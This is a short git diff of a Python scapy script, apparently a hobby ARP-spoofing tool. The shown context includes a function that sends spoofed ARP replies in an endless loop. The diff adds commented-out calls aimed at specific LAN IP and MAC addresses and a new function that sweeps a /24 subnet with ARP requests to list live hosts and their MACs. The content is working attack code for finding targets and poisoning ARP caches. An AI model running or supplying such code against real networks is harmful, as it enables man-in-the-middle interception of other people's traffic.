@@ -14,5 +14,19 @@ def send_arp_spoof(my_ip, router_ip, Target_ip, My_mac, Target_mac):
     while True:
         s.sendp(arp_spoof)
 
+#target_mac = Get_target_mac_adress("10.100.102.36", "10.100.102.10","fc:b2:14:77:44:66" )
+#send_arp_spoof("10.100.102.36", "10.100.102.1", "10.100.102.10","fc:b2:14:77:44:66", target_mac )
 
-
+def find_all_ip():
+    all_ip_list = []
+    for i in range(1,255):
+        print(f"now checking -  10.100.102.{i}...")
+        arp_request = s.Ether(dst = "ff:ff:ff:ff:ff:ff", src="fc:b2:14:77:44:66" )/s.ARP(op= 1, psrc= "10.100.102.34", pdst=f"10.100.102.{i}", hwsrc= "fc:b2:14:77:44:66")   
+        
+        answered, unanswered = s.srp(arp_request, timeout= 1, verbose= False)
+        if answered:
+            ip_and_mac = (f"10.100.102.{i}", answered[0][1].hwsrc)
+            all_ip_list.append(ip_and_mac)
+    return all_ip_list
+all_ip = find_all_ip()
+print(all_ip)
